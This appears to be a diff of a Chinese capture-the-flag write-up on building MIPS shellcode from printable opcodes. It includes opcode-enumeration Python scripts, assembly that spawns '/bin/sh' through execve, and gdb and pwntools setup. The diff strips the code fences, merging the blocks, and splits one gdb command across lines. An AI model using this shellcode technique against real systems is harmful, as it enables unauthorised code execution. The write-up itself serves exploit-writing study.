@@ -244,27 +244,12 @@ https://www.ichunqiu.com/competition
 [ 6 bits  ][ 5 bits  ][ 5 bits  ][ 5 bits  ][ 5 bits  ][ 6 bits  ]
 [  000000 ][  00000  ][  00000  ][  00000  ][  00000  ][ 000000  ]
 [ opcode  ][   rs    ][   rt    ][   rd    ][  shamt  ][  funct  ]
-```
-
-
-
-```
 [ 6 bits  ][ 5 bits  ][ 5 bits  ][    16 bits     ]
 [ 000000  ][  00000  ][  00000  ][0000000000000000]
 [ opcode  ][  rs     ][  rt     ][   immediate    ]
-```
-
-
-
-```
 [ 6 bits  ][         26 bits          ]
 [ 000000  ][00000000000000000000000000]
 [ opcode  ][        address           ]
-```
-
-
-
-```
 def get_all_opcode():
     for i in range(0x21, 0x7e + 1):
         bin_i = bin(i)[2:]
@@ -276,11 +261,6 @@ def get_all_opcode():
             opcode.append(bin_i)
     print(opcode)
     info("Function get_all_opcode Over")
-```
-
-
-
-```
 def find_I_instruction(rs,rt,savefile):
     # rs = "00011" # 3
     # rt = "00010" # 2
@@ -302,11 +282,6 @@ def find_I_instruction(rs,rt,savefile):
         f.write(run_command(command)+"n")
     f.close()
     info("Function find_I_instruction Over")
-```
-
-
-
-```
 !_0x21_001000
 0: 20628001  addi v0,v1,-32767
 
@@ -356,11 +331,6 @@ $_0x24_001001
 0: 30628001  andi v0,v1,0x8001
 
 # ......太长不放出来了
-```
-
-
-
-```
 def find_I_rs():
     for i in opcode:
         for j in opcode:  
@@ -370,11 +340,6 @@ def find_I_rs():
                 print("Get")
                 pause()
     info("Function find_I_rs Over")
-```
-
-
-
-```
 def find_I_rt():
     for i in opcode:
         rt = i[3:]
@@ -383,19 +348,9 @@ def find_I_rt():
             print("Get")
             pause()
     info("Function find_I_rt Over")
-```
-
-
-
-```
 beqzl $t0, local_random # $t0=0 则跳转到 local_random
 sw $t1, 0($t1) # 延迟槽
 lw  $a0, 0($t1)
-```
-
-
-
-```
 addi # 0x21 - 0x23
 addiu # 0x24 - 0x27
 slti # 0x28 - 0x2b
@@ -413,11 +368,6 @@ beqzl(rt=0) # 0x50 - 0x53
 bnezl(rt=0) # 0x54 - 0x57
 blezl(rt=0) # 0x58 - 0x5b
 bgtzl(rt=0) # 0x5c - 0x5f
-```
-
-
-
-```
 # 将//bin/sh 放入$a0 $a1
 li $a0, 0x69622f2f
 li $a1, 0x68732f6e
@@ -436,11 +386,6 @@ li $a2, 0
 # execve系统调用号4011
 li $v0, 4011
 syscall
-```
-
-
-
-```
 # merge函数将给出形如下面四行的result.txt
 # !! 0x21 RS Num: 9 RT 0x21 1
 # !" 0x21 RS Num: 9 RT 0x22 2
@@ -563,20 +508,11 @@ if __name__ == "__main__":
     # find_I_imm()
 
     merge()
-```
-
-
-
-```
 gdb-multiarch
 set arch mips
-target remote :1234
+target remote :
+1234
 file /home/pwn/Desktop/test/pwn # 我没去除调试符号，所以可以加载
-```
-
-
-
-```
 from pwn import *
 context(os = 'linux', arch = 'mips', log_level = 'debug')
 # file_path = './test'
